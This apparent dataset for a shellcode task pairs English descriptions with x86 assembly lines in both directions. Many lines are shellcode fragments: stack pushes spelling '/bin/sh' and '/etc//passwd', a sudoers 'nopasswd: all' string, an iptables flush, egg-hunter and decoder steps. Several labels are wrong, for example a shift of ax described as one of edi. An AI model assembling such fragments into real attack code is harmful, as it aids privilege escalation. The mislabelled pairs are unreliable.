input_text,target_text
ShellCodeGen: jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register,"cmp eax, ebx \n jne retry"
"ShellCodeSum: mov eax, esi",move esi into eax
"ShellCodeSum: push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov edx, esp",push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the edx register to the stack register
ShellCodeGen: move bl into the byte at address [edx + eax],"mov byte [edx + eax], bl"
ShellCodeGen: push the word 0x776f onto the stack,push word 0x776f
ShellCodeGen: replaces the contents of the ebx register with its two's complement,neg ebx
ShellCodeSum: jmp short rotate,jump short to the rotate label
ShellCodeGen: push the byte 0x0 onto the stack,push byte 0x0
ShellCodeGen: push 0x74303072 onto the stack,push 0x74303072
"ShellCodeSum: shr ax, cl",right shift the contents of the edi register by the contents of the cl register
"ShellCodeSum: mov eax, 2",make the system call fork
ShellCodeGen: move the byte 2ah into al,"mov al, byte 2ah"
"ShellCodeSum: mov dword [esp-0x8], 0x65636170",move the value 0x65636170 into the double word starting at the address [esp-0x8]
ShellCodeGen: if the contents of the eax register is zero then jump to the label check_html else jump to the while label,"test eax, eax \n jz check_html \n jmp while"
ShellCodeSum: push 0x5,push the 0x5 onto the stack
ShellCodeGen: initialize bx to 0,"xor bx, bx"
ShellCodeGen: load the effective address of the result of the operation [esi + 13] into the edi register,"lea edi, [esi + 13]"
"ShellCodeSum: sub esp, 4",allocate memory for local variables
ShellCodeGen: push the 20 onto the stack,push 20
ShellCodeGen: load the effective address of the result of the operation [esi + 8] into the ecx register,"lea ecx, [esi + 8]"
ShellCodeSum: push 0x682f2f2f,push 0x682f2f2f onto the stack
ShellCodeGen: push the dword [edx+2] onto the stack,push dword [edx+2]
ShellCodeGen: push the dword 0x6d6f646e onto the stack,push dword 0x6d6f646e
"ShellCodeSum: test eax, eax \n js _while_loop",if the contents of the eax register is negative then jump to the label _while_loop
ShellCodeGen: push the byte 0x3f onto the stack,push byte 0x3f
ShellCodeSum: int 80h,make the system calls to the kernel
ShellCodeGen: move 43 decimal into edx,"mov edx, 43"
ShellCodeGen: push the word 0x5c11 to the stack,push word 0x5c11
"ShellCodeSum: test ax, ax \n jnz exeunt \n jmp carryon",if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon
ShellCodeGen: execute the reboot syscall,int 0x80
ShellCodeSum: call internetreadfile,call function internetreadfile
ShellCodeSum: file: db '/sbin/iptables#-f',define file as the byte string '/sbin/iptables#-f'
"ShellCodeSum: cmp bl, 78h \n jl short loc_402B1D",if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D
ShellCodeSum: inc dword [tmp],add one to the doubleword integer stored at memory location tmp
ShellCodeGen: move name into ebx,"mov ebx, name"
"ShellCodeSum: mov ecx, donemsg",move donemsg into ecx
ShellCodeGen: push the value 0x6374652f onto the stack and point edx to the stack register,"push 0x6374652f \n mov edx, esp"
"ShellCodeSum: cmp eax, ebx \n je all",if the contents of the eax register is equal to the contents of the ebx register then jump to the all label
ShellCodeGen: allocate memory for a null terminated string 'hello\n',"message db 'hello',13,0"
ShellCodeGen: call the execute function,call execute
"ShellCodeSum: and mask1, 128",perform and operation on the variable mask1 and 128
ShellCodeGen: push the value 0x2f2f2f2f onto the stack and point ecx to the stack register,"push 0x2f2f2f2f \n mov ecx, esp"
ShellCodeGen: subtract the contents of eax from the contents of eax,"sub eax, eax"
ShellCodeGen: move ebp into edx,"mov edx, ebp"
ShellCodeGen: jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero,"cmp [ebp+var_a], 0 \n jnz short loc_4010E5"
"ShellCodeSum: mov ax, [my_var]",copy my_var contents in ax
ShellCodeGen: push the 0x6374652f onto the stack,push 0x6374652f
ShellCodeGen: subtract 0x7 from the contents in bl and save the result in bl,"sub bl, 0x7"
"ShellCodeSum: add byte [var], 30",add 30 to the single byte stored at memory address var
"ShellCodeSum: mov esi, 0x65636170",move 0x65636170 into esi
ShellCodeSum: _start:,define the _start label
ShellCodeGen: move b to ecx,"mov ecx, b"
ShellCodeGen: compare ecx and ebp,"cmp ecx, ebp"
"ShellCodeSum: xchg edx, eax",swap the values of edx and eax registers
ShellCodeGen: define string as the byte string 'file1.txt',string: db 'file1.txt'
ShellCodeSum: push byte 0x3f,push the byte 0x3f onto the stack
ShellCodeSum: push 0x2f6e6962,push 0x2f6e6962 onto the stack
"ShellCodeSum: mov esi, eax",move eax into esi
ShellCodeSum: retry:,declare retry label
ShellCodeGen: right shift the contents of the ebx register by the contents of the cl register,"shr ebx, cl"
ShellCodeSum: pop eax,restore the top of the stack into eax register
ShellCodeGen: add ebx to ecx,"add ecx, ebx"
ShellCodeGen: move 0x776f into the word in [esp+0x1],"mov word [esp+0x1], 0x776f"
ShellCodeGen: move the byte at the address [esi+ecx+1] into bl,"mov bl, byte [esi+ecx+1]"
"ShellCodeSum: mov al, dl",move dl into al
ShellCodeGen: put the syscall 0x0b into the eax register,push byte 0x0b \n pop eax
ShellCodeGen: move 0ah into eax,"mov eax, 0ah"
ShellCodeGen: push 0x782f6e69 onto the stack,push 0x782f6e69
ShellCodeGen: push 0x3458652e onto the stack,push 0x3458652e
ShellCodeGen: move 0x01 into bl,"mov bl, 0x01"
"ShellCodeSum: mov bx, word_value",move memory word_value to register bx
ShellCodeGen: jump to the label check_html if the contents of the eax register is zero,"test eax, eax \n jz check_html"
"ShellCodeSum: cmp bl, 78h \n jge short loc_402B1D",if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D
ShellCodeGen: perform xor operation between ebx register and the word __flag_byte and save the result in ebx,"xor [ebx], word __flag_byte"
ShellCodeSum: _continue:,define the _continue label
ShellCodeSum: push 0x69622f65,push 0x69622f65 onto the stack
"ShellCodeSum: mov ecx, hello",put the offset of hello in ecx
ShellCodeSum: push dword 0x45525649,push the dword 0x45525649 onto the stack
ShellCodeGen: push the word 0x2 to the stack,push word 0x2
ShellCodeGen: subtract the byte at the address esi from the contents of the dl register,"sub dl, byte [esi]"
"ShellCodeSum: mov eax, [y]",move the contents at memory specified by y to eax
ShellCodeGen: jump to retry if not equal,jne retry
ShellCodeGen: move esi into the address [esi+35],"mov [esi+35], esi"
"ShellCodeSum: mov eax, 3",make the system call read
ShellCodeGen: jump to 804809a if not equal,jne 804809a
"ShellCodeSum: mov esi, 10",move 10 into esi
ShellCodeGen: jump short to the .exit label,jmp short .exit
"ShellCodeGen: define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d","db 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d"
ShellCodeGen: call the _build function,call _build
ShellCodeGen: put the syscall 28 into the eax register,push byte 28 \n pop eax
ShellCodeGen: define message as the byte string '/bin/sh',message db '/bin/sh'
ShellCodeGen: move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register,"mov ebx, [ebp-8]"
ShellCodeSum: main:,declare the main label
ShellCodeGen: subtract the byte value 3 from the contents of ebx and save the result in ebx,"sub ebx, byte 3"
ShellCodeSum: push dword [edx+2],push the doubleword [edx+2] to the stack
"ShellCodeSum: shl ebx, 2",multiply ebx by 4 using left shift
ShellCodeGen: subtract the contents of the dx register from the contents of the bx register,"sub bx, dx"
"ShellCodeSum: mov ecx, 0x1",move 0x1 into ecx
ShellCodeGen: move the contents of al into the byte at the memory location specified by the operation [esi+14],"mov byte [esi+14],al"
ShellCodeGen: add 0x25 to the al register,"add al, 0x25"
ShellCodeSum: push byte 0x06,push the byte 0x06 onto the stack
ShellCodeSum: push word 0x5445,push the word 0x5445 onto the stack
ShellCodeGen: subtract 12 from esp register and save the result in esp,"sub esp, 12"
ShellCodeSum: push 0x61622f2f,push 0x61622f2f onto the stack
"ShellCodeSum: push 0x7461632f \n push 0x6e69622f \n mov ebx, esp",push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register
ShellCodeSum: loop decrypt \n jmp encrypt,decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label
ShellCodeSum: pop si,restore the top of the stack into the si register
ShellCodeSum: jmp short shellcode,jump short to the shellcode label
"ShellCodeSum: mov dx, 1222",move 1222 into dx
ShellCodeGen: define the byte 0xcd,db 0xcd
ShellCodeGen: move the byte in esi+ecx+1 into bl,"mov bl, byte [esi+ecx+1]"
"ShellCodeSum: mov bl, 10",move 10 into bl
ShellCodeGen: load the effective address of the result of the operation [ebp+39] into the ebx register,"lea ebx, [ebp+39]"
ShellCodeGen: push the value 0x6374652f onto the stack and point edi to the stack register,"push 0x6374652f \n mov edi, esp"
"ShellCodeSum: mov ebx, [x]",move the contents at memory address x to ebx
ShellCodeGen: move 0x35 into dh,"mov dh, 0x35"
"ShellCodeSum: mov eax, 3",read
ShellCodeGen: load the effective address of the operation [bp+di+0x32] into the cx register,"lea cx, [bp+di+0x32]"
"ShellCodeSum: sub al, ah",subtract ah from al
ShellCodeGen: push the word 0x02 onto the stack,push word 0x02
"ShellCodeSum: mov ecx, msg",move the address of message string into ecx
ShellCodeGen: declare one label,one:
ShellCodeSum: loop main_inc,decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero
ShellCodeGen: push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edi register to the stack register,"push 0x61702f2f \n push 0x6374652f \n mov edi, esp"
ShellCodeGen: save the old base pointer value,push ebp
ShellCodeGen: test the value of cl,"test cl, cl"
ShellCodeGen: move dword 0x65676760 into edx,"mov edx, dword 0x65676760"
"ShellCodeSum: mov al, 0x01",move 0x1 into lower byte of the eax register
ShellCodeSum: cdq,extend the sign bit of eax register into the edx register
ShellCodeSum: jmp short stage,jump short to the stage label
"ShellCodeSum: mov eax, 7",wait for child to terminate
ShellCodeGen: define the _socket label,_socket:
ShellCodeSum: push 0x30313a31,push 0x30313a31 to the stack
"ShellCodeSum: sub ebx, byte 3",subtract the byte value 3 from the contents of ebx and save the result in ebx
ShellCodeGen: move 99 into al,"mov al, 99"
"ShellCodeSum: mov eax, [ebp+8]",move value of memory address [ebp+8] into eax
ShellCodeGen: push 0x6e7a762d onto the stack,push 0x6e7a762d
ShellCodeSum: db 'egg mark',define the byte string 'egg mark'
ShellCodeGen: divide eax by ecx,div ecx
ShellCodeGen: define the byte string 'all all=(all) nopasswd: all',"db 'all all=(all) nopasswd: all', 0xa"
ShellCodeGen: add 0x66 to the contents in al and save the result in al,"add al, 0x66"
"ShellCodeSum: cmp cl, dl \n jb l3",jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register
ShellCodeSum: push 10,push 10 onto the stack
ShellCodeSum: push 0x7374736f,push 0x7374736f onto the stack
ShellCodeSum: 1:,define the label 1
ShellCodeGen: if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D,"cmp bl, 78h \n jle short loc_402B1D"
ShellCodeGen: move the value 0x4 onto the stack,"mov bl, 0x4"
ShellCodeGen: jump to the encoded label if the zero flag is set,jz encoded
ShellCodeGen: move 1 into al,"mov al, 1"
"ShellCodeSum: sub edi, 0xffffffdf",subtract 0xffffffdf from edi
ShellCodeSum: scasd \ jnz _end \n jmp edi,jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
ShellCodeSum: push byte 8 \n pop eax,put the syscall 8 into the eax register
ShellCodeGen: add 4 to esi,"add esi, 4"
ShellCodeGen: swap the values of esi and eax,"xchg esi, eax"
ShellCodeGen: decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register,"loop l4 \n mov edx, esp"
"ShellCodeSum: push edx \n mov ebx, esp",push the contents of the edx register onto the stack and point ebx to the stack register
"ShellCodeSum: push word 0x662d \n mov edx, esp",push the word 0x662d onto the stack and point the edx register to the stack register
ShellCodeSum: db 'my.txtx',define the byte string 'my.txtx'
ShellCodeGen: push 0x746f6f72 onto the stack,push 0x746f6f72
ShellCodeGen: move 0x3734b117 into edi,"mov edi, 0x3734b117"
ShellCodeSum: jmp short get,jump short to the get label
"ShellCodeSum: mov ebx, esi",move esi into ebx
ShellCodeSum: push 102,push 102 onto the stack
ShellCodeSum: jmp eax,jump to the value stored in the eax register
ShellCodeSum: call cont,call the cont function
ShellCodeGen: push the dword 0x64616568 onto the stack,push dword 0x64616568
ShellCodeSum: push word 0x6d6f,push the word 0x6d6f onto the stack
"ShellCodeSum: mov dword [esp-8], edi",move edi into the doubleword starting at the address esp-8
ShellCodeGen: move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register,"mov ecx, [ebp+12]"
ShellCodeGen: move the memory address of our file contents variable into ecx,"mov ecx, filecontents"
ShellCodeGen: system call fork,"mov eax, 2"
ShellCodeGen: push the word 1 onto the stack and point eax to the stack register,"push word 1 \n mov eax, esp"
"ShellCodeSum: cmp dword [eax-8], egg",compare the dword at the address [eax-8] and egg
ShellCodeGen: push the contents of the esi register onto the stack and point edx to the stack register,"push esi \n mov edx, esp"
ShellCodeGen: push ecx on the stack,push ecx
ShellCodeGen: decrement eax,dec eax
ShellCodeGen: define call_decoder function,call_decoder:
"ShellCodeSum: mov ebx, 1",write to the stdout file
